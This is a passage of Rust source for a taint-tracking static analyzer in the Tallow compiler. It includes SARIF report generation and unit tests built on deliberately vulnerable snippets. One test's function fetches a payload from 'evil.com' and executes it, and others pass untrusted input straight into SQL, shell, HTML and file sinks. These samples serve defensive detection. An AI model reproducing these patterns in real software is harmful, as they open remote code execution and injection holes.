                    self.check_expr_sinks(v, tainted, fn_name, fn_map, impl_fn_map, depth);
                }
            }

            ExprKind::Bail(inner) => {
                self.check_expr_sinks(inner, tainted, fn_name, fn_map, impl_fn_map, depth);
            }

            // ── Concurrency (Phase 1) — nothing to check yet ─────────────
            ExprKind::Spawn { .. } | ExprKind::Select { .. } => {}

            ExprKind::IfLet {
                expr,
                then_block,
                else_branch,
                ..
            } => {
                self.check_expr_sinks(expr, tainted, fn_name, fn_map, impl_fn_map, depth);
                for s in &then_block.stmts {
                    self.analyze_stmt(s, &mut tainted.clone(), fn_name, fn_map, impl_fn_map, depth);
                }
                match else_branch {
                    Some(ElseBranch::Block(block)) => {
                        for s in &block.stmts {
                            self.analyze_stmt(
                                s,
                                &mut tainted.clone(),
                                fn_name,
                                fn_map,
                                impl_fn_map,
                                depth,
                            );
                        }
                    }
                    Some(ElseBranch::ElseIf(e)) => {
                        self.check_expr_sinks(e, tainted, fn_name, fn_map, impl_fn_map, depth);
                    }
                    None => {}
                }
            }

            // Terminals: no sub-expressions
            ExprKind::IntLit(_)
            | ExprKind::FloatLit(_)
            | ExprKind::StringLit(_)
            | ExprKind::BoolLit(_)
            | ExprKind::Nil
            | ExprKind::Ident(_)
            | ExprKind::DotIdent(_) => {}
        }
    }

    /// Emit a diagnostic for tainted data reaching a sink.
    fn emit_sink_error(
        &mut self,
        sink_kind: SinkKind,
        source_var: &str,
        sink_fn: &str,
        in_fn: &str,
        call_span: Span,
        _source_span: Span,
    ) {
        let code = sink_kind.error_code();
        let description = sink_kind.description();
        let msg = format!(
            "tainted data `{source_var}` flows to {description} `{sink_fn}()` in function `{in_fn}`"
        );
        let help = format!(
            "sanitize `{source_var}` with a @sanitizer function before passing to `{sink_fn}()`"
        );

        self.diags
            .push(crate::error::Diagnostic::error(code, &msg, call_span).with_help(help));

        self.findings.push(SarifFinding {
            rule_id: code.to_string(),
            message: msg,
            level: "error".to_string(),
            span: call_span,
            cwe_id: Some(sink_kind.cwe_id().to_string()),
            cwe_name: Some(sink_kind.cwe_name().to_string()),
            source_var: Some(source_var.to_string()),
            sink_fn: Some(sink_fn.to_string()),
        });
    }
}

// ── Untrusted<T> Type Detection ────────────────────────────────────────────

/// Check whether a type expression is `Untrusted<T>`.
fn is_untrusted_type(ty: &TypeExpr) -> bool {
    match &ty.kind {
        TypeExprKind::Generic { name, .. } => name == "Untrusted",
        TypeExprKind::Named(name) => name == "Untrusted",
        _ => false,
    }
}

// ── SARIF Output ───────────────────────────────────────────────────────────

/// Generate SARIF 2.1.0 JSON output from a list of findings.
pub fn generate_sarif(findings: &[SarifFinding]) -> String {
    let mut rules = Vec::new();
    let mut seen_rules: HashSet<String> = HashSet::new();

    for f in findings {
        if !seen_rules.contains(&f.rule_id) {
            seen_rules.insert(f.rule_id.clone());
            let mut rule = format!(
                r#"{{
          "id": "{}",
          "shortDescription": {{
            "text": "{}"
          }}"#,
                f.rule_id,
                rule_short_description(&f.rule_id)
            );

            if let (Some(cwe_id), Some(cwe_name)) = (&f.cwe_id, &f.cwe_name) {
                rule.push_str(&format!(
                    r#",
          "properties": {{
            "tags": ["security", "{}"],
            "cwe": "{}: {}"
          }}"#,
                    cwe_id, cwe_id, cwe_name
                ));
            }

            rule.push('}');
            rules.push(rule);
        }
    }

    let results: Vec<String> = findings
        .iter()
        .map(|f| {
            format!(
                r#"{{
          "ruleId": "{}",
          "level": "{}",
          "message": {{
            "text": "{}"
          }},
          "locations": [
            {{
              "physicalLocation": {{
                "region": {{
                  "startLine": 1,
                  "charOffset": {},
                  "charLength": {}
                }}
              }}
            }}
          ]
        }}"#,
                f.rule_id,
                f.level,
                escape_json_string(&f.message),
                f.span.start,
                f.span.end.saturating_sub(f.span.start)
            )
        })
        .collect();

    format!(
        r#"{{
  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/main/sarif-2.1/schema/sarif-schema-2.1.0.json",
  "version": "2.1.0",
  "runs": [
    {{
      "tool": {{
        "driver": {{
          "name": "tallow-sast",
          "version": "0.1.0",
          "informationUri": "https://github.com/aamirmanisa/tallowsphere",
          "rules": [
            {}
          ]
        }}
      }},
      "results": [
        {}
      ]
    }}
  ]
}}"#,
        rules.join(",\n            "),
        results.join(",\n        ")
    )
}

fn rule_short_description(rule_id: &str) -> &'static str {
    match rule_id {
        "E2200" => "SQL Injection: tainted data flows to SQL query",
        "E2201" => "Command Injection: tainted data flows to shell command",
        "E2202" => "Cross-Site Scripting: tainted data flows to HTML output",
        "E2203" => "Path Traversal: tainted data flows to file path operation",
        "E2204" => "Insecure Deserialization: tainted data flows to deserializer",
        "E2205" => "Sanitizer function missing return statement",
        "W2200" => "Tainted data used without sanitization",
        "W2201" => "Interprocedural taint flow detected",
        _ => "Unknown SAST finding",
    }
}

fn escape_json_string(s: &str) -> String {
    s.replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('\n', "\\n")
        .replace('\r', "\\r")
        .replace('\t', "\\t")
}

// ── Tests ──────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    /// Helper: parse Tallow source and run the SAST pass, returning diagnostics.
    fn run_sast(source: &str) -> Diagnostics {
        let (tokens, lex_errors) = crate::lexer::tokenize(source);
        assert!(lex_errors.is_empty(), "lex errors: {:?}", lex_errors);
        let program = crate::parser::Parser::parse(tokens).expect("parse error");
        SastPass::new(&program).check()
    }

    /// Helper: parse Tallow source and run the SAST pass, returning diagnostics and findings.
    fn run_sast_with_findings(source: &str) -> (Diagnostics, Vec<SarifFinding>) {
        let (tokens, lex_errors) = crate::lexer::tokenize(source);
        assert!(lex_errors.is_empty(), "lex errors: {:?}", lex_errors);
        let program = crate::parser::Parser::parse(tokens).expect("parse error");
        SastPass::new(&program).check_with_findings()
    }

    // ── Test 1: SQL injection detected (E2200) ────────────────────────────

    #[test]
    fn test_sql_injection_detected() {
        let diags = run_sast(
            r#"
@http_handler
fn handle_search(input: String) -> String {
    let result = sql_query(input)
    result
}
"#,
        );
        let errors: Vec<_> = diags.items.iter().filter(|d| d.code == "E2200").collect();
        assert!(
            !errors.is_empty(),
            "expected E2200 for SQL injection, got: {:?}",
            diags.items
        );
    }

    // ── Test 2: Command injection detected (E2201) ────────────────────────

    #[test]
    fn test_command_injection_detected() {
        let diags = run_sast(
            r#"
@http_handler
fn handle_run(cmd: String) -> String {
    let output = exec(cmd)
    output
}
"#,
        );
        let errors: Vec<_> = diags.items.iter().filter(|d| d.code == "E2201").collect();
        assert!(
            !errors.is_empty(),
            "expected E2201 for command injection, got: {:?}",
            diags.items
        );
    }

    // ── Test 3: XSS detected (E2202) ─────────────────────────────────────

    #[test]
    fn test_xss_detected() {
        let diags = run_sast(
            r#"
@http_handler
fn handle_page(user_input: String) -> String {
    let page = render_html(user_input)
    page
}
"#,
        );
        let errors: Vec<_> = diags.items.iter().filter(|d| d.code == "E2202").collect();
        assert!(
            !errors.is_empty(),
            "expected E2202 for XSS, got: {:?}",
            diags.items
        );
    }

    // ── Test 4: Path traversal detected (E2203) ──────────────────────────

    #[test]
    fn test_path_traversal_detected() {
        let diags = run_sast(
            r#"
@http_handler
fn handle_file(path: String) -> String {
    let data = read_file(path)
    data
}
"#,
        );
        let errors: Vec<_> = diags.items.iter().filter(|d| d.code == "E2203").collect();
        assert!(
            !errors.is_empty(),
            "expected E2203 for path traversal, got: {:?}",
            diags.items
        );
    }

    // ── Test 5: Deserialization sink detected (E2204) ─────────────────────

    #[test]
    fn test_deserialization_detected() {
        let diags = run_sast(
            r#"
@http_handler
fn handle_data(raw: String) -> String {
    let obj = from_json(raw)
    obj
}
"#,
        );
        let errors: Vec<_> = diags.items.iter().filter(|d| d.code == "E2204").collect();
        assert!(
            !errors.is_empty(),
            "expected E2204 for deserialization sink, got: {:?}",
            diags.items
        );
    }

    // ── Test 6: Sanitizer suppresses taint ────────────────────────────────

    #[test]
    fn test_sanitizer_suppresses() {
        let diags = run_sast(
            r#"
@sanitizer
fn escape_sql(input: String) -> String {
    input
}

@http_handler
fn handle_search(input: String) -> String {
    let safe = escape_sql(input)
    let result = sql_query(safe)
    result
}
"#,
        );
        let errors: Vec<_> = diags.items.iter().filter(|d| d.code == "E2200").collect();
        assert!(
            errors.is_empty(),
            "sanitizer should suppress E2200, got: {:?}",
            errors
        );
    }

    // ── Test 7: No taint, no errors ──────────────────────────────────────

    #[test]
    fn test_no_taint_no_errors() {
        let diags = run_sast(
            r#"
fn safe_function() -> String {
    let query = "SELECT * FROM users"
    let result = sql_query(query)
    result
}
"#,
        );
        let errors: Vec<_> = diags
            .items
            .iter()
            .filter(|d| d.code.starts_with("E22"))
            .collect();
        assert!(
            errors.is_empty(),
            "non-handler function should not produce errors, got: {:?}",
            errors
        );
    }

    // ── Test 8: Taint propagation through assignment ─────────────────────

    #[test]
    fn test_taint_propagation() {
        let diags = run_sast(
            r#"
@http_handler
fn handle_request(input: String) -> String {
    let x = input
    let y = x
    let z = y
    let result = sql_query(z)
    result
}
"#,
        );
        let errors: Vec<_> = diags.items.iter().filter(|d| d.code == "E2200").collect();
        assert!(
            !errors.is_empty(),
            "taint should propagate through assignments, got: {:?}",
            diags.items
        );
    }

    // ── Test 9: Interprocedural taint flow ──────────────────────────────

    #[test]
    fn test_interprocedural() {
        let diags = run_sast(
            r#"
fn do_query(q: String) -> String {
    let result = sql_query(q)
    result
}

@http_handler
fn handle_search(input: String) -> String {
    let result = do_query(input)
    result
}
"#,
        );
        // Should have W2201 for interprocedural flow
        let warnings: Vec<_> = diags.items.iter().filter(|d| d.code == "W2201").collect();
        assert!(
            !warnings.is_empty(),
            "interprocedural taint should produce W2201, got: {:?}",
            diags.items
        );
        // Should also detect the SQL injection in do_query via interprocedural analysis
        let errors: Vec<_> = diags.items.iter().filter(|d| d.code == "E2200").collect();
        assert!(
            !errors.is_empty(),
            "interprocedural taint should detect E2200 SQL injection, got: {:?}",
            diags.items
        );
    }

    // ── Test 10: SARIF output ────────────────────────────────────────────

    #[test]
    fn test_sarif_output() {
        let (_, findings) = run_sast_with_findings(
            r#"
@http_handler
fn handle_search(input: String) -> String {
    let result = sql_query(input)
    result
}
"#,
        );
        assert!(!findings.is_empty(), "should have findings");
        let sarif = generate_sarif(&findings);
        assert!(
            sarif.contains("\"version\": \"2.1.0\""),
            "should be SARIF 2.1.0"
        );
        assert!(sarif.contains("tallow-sast"), "should contain tool name");
        assert!(sarif.contains("E2200"), "should contain rule ID");
        assert!(sarif.contains("CWE-89"), "should contain CWE mapping");
    }

    // ── Test 11: @source annotation marks function return as tainted ─────

    #[test]
    fn test_source_annotation() {
        let diags = run_sast(
            r#"
@source
fn get_user_input() -> String {
    "anything"
}

fn process() -> String {
    let input = get_user_input()
    let result = exec(input)
    result
}
"#,
        );
        // get_user_input is @source, so its return value in process() taints `input`
        // But process() itself is not an HTTP handler, so its own params are not tainted.
        // However, `input` is assigned from a @source function, so it should be tainted.
        // We need process() to detect that get_user_input() is a source.
        // The current implementation checks expr_calls_source for Let assignments.
        // `input` should become tainted via expr_calls_source.
        // Then `exec(input)` should trigger E2201.
        let errors: Vec<_> = diags.items.iter().filter(|d| d.code == "E2201").collect();
        assert!(
            !errors.is_empty(),
            "@source function should taint the result, got: {:?}",
            diags.items
        );
    }

    // ── Test 12: @sink annotation ────────────────────────────────────────

    #[test]
    fn test_sink_annotation() {
        let diags = run_sast(
            r#"
@sink(kind: .sql)
fn custom_query(q: String) -> String {
    q
}

@http_handler
fn handle_search(input: String) -> String {
    let result = custom_query(input)
    result
}
"#,
        );
        let errors: Vec<_> = diags.items.iter().filter(|d| d.code == "E2200").collect();
        assert!(
            !errors.is_empty(),
            "@sink annotation should make custom_query a SQL sink, got: {:?}",
            diags.items
        );
    }

    // ── Test 13: Untrusted<T> type marks parameter as tainted ────────────

    #[test]
    fn test_untrusted_type() {
        let diags = run_sast(
            r#"
fn process(input: Untrusted<String>) -> String {
    let result = exec(input)
    result
}
"#,
        );
        let errors: Vec<_> = diags.items.iter().filter(|d| d.code == "E2201").collect();
        assert!(
            !errors.is_empty(),
            "Untrusted<T> should mark param as tainted, got: {:?}",
            diags.items
        );
    }

    // ── Test 14: @sanitizer with empty body → E2205 ──────────────────────

    #[test]
    fn test_sanitizer_empty_body() {
        let diags = run_sast(
            r#"
@sanitizer
fn bad_sanitizer(input: String) -> String {
}
"#,
        );
        let errors: Vec<_> = diags.items.iter().filter(|d| d.code == "E2205").collect();
        assert!(
            !errors.is_empty(),
            "empty sanitizer should produce E2205, got: {:?}",
            diags.items
        );
    }

    // ── Test 15: Fetch result is tainted ─────────────────────────────────

    #[test]
    fn test_fetch_result_tainted() {
        let diags = run_sast(
            r#"
fn download_and_exec() -> String {
    let data = fetch("https://evil.com/payload")
    let result = exec(data)
    result
}
"#,
        );
        let errors: Vec<_> = diags.items.iter().filter(|d| d.code == "E2201").collect();
        assert!(
            !errors.is_empty(),
            "fetch() result should be tainted, got: {:?}",
            diags.items
        );
    }

    // ── Test 16: Multiple sinks in one function ──────────────────────────

    #[test]
    fn test_multiple_sinks() {
        let diags = run_sast(
            r#"
@http_handler
fn handle_everything(input: String) -> String {
    let a = sql_query(input)
    let b = exec(input)
    let c = render_html(input)
    a
}
"#,
        );
        let sql: Vec<_> = diags.items.iter().filter(|d| d.code == "E2200").collect();
        let cmd: Vec<_> = diags.items.iter().filter(|d| d.code == "E2201").collect();
        let xss: Vec<_> = diags.items.iter().filter(|d| d.code == "E2202").collect();
        assert!(!sql.is_empty(), "should detect SQL injection");
        assert!(!cmd.is_empty(), "should detect command injection");
        assert!(!xss.is_empty(), "should detect XSS");
    }

    // ── Test 17: Taint in for-loop body ──────────────────────────────────

    #[test]
    fn test_taint_in_loop() {
        let diags = run_sast(
            r#"
@http_handler
fn handle_batch(items: String) -> String {
    for item in items {
        exec(item)
    }
    "done"
}
"#,
        );
        let errors: Vec<_> = diags.items.iter().filter(|d| d.code == "E2201").collect();
        assert!(
            !errors.is_empty(),
            "taint should propagate through for-loop binding, got: {:?}",
            diags.items
        );
    }

    // ── Test 18: SARIF contains CWE mappings ─────────────────────────────

    #[test]
    fn test_sarif_cwe_mappings() {
        let (_, findings) = run_sast_with_findings(
            r#"
@http_handler
fn handle_all(input: String) -> String {
    let a = sql_query(input)
    let b = exec(input)
    let c = render_html(input)
    let d = read_file(input)
    let e = from_json(input)
    a
}
"#,
        );

        let sarif = generate_sarif(&findings);
        assert!(
            sarif.contains("CWE-89"),
            "should contain CWE-89 (SQL injection)"
        );
        assert!(
            sarif.contains("CWE-78"),
            "should contain CWE-78 (command injection)"
        );
        assert!(sarif.contains("CWE-79"), "should contain CWE-79 (XSS)");
        assert!(
            sarif.contains("CWE-22"),
            "should contain CWE-22 (path traversal)"
        );
        assert!(
            sarif.contains("CWE-502"),
            "should contain CWE-502 (deserialization)"
        );
    }

    // ── Test 19: Sanitizer in method position ────────────────────────────

    #[test]
    fn test_method_sanitizer() {
        let diags = run_sast(
            r#"
@sanitizer
fn escape(input: String) -> String {
    input
}

@http_handler
fn handle_request(input: String) -> String {
    let safe = escape(input)
    let result = exec(safe)
    result
}
"#,
        );
        let errors: Vec<_> = diags.items.iter().filter(|d| d.code == "E2201").collect();
        assert!(
            errors.is_empty(),
            "sanitizer should cleanse taint, got: {:?}",
            errors
        );
    }

    // ── Test 20: Impl method with taint ──────────────────────────────────

    #[test]
    fn test_impl_method_taint() {
        let diags = run_sast(
            r#"
struct Handler {}

impl Handler {
    @http_handler
    fn handle(self, input: String) -> String {
        let result = sql_query(input)
        result
    }
}
"#,
        );
        let errors: Vec<_> = diags.items.iter().filter(|d| d.code == "E2200").collect();
        assert!(
            !errors.is_empty(),
            "impl method should also detect SQL injection, got: {:?}",
            diags.items
        );
    }
}
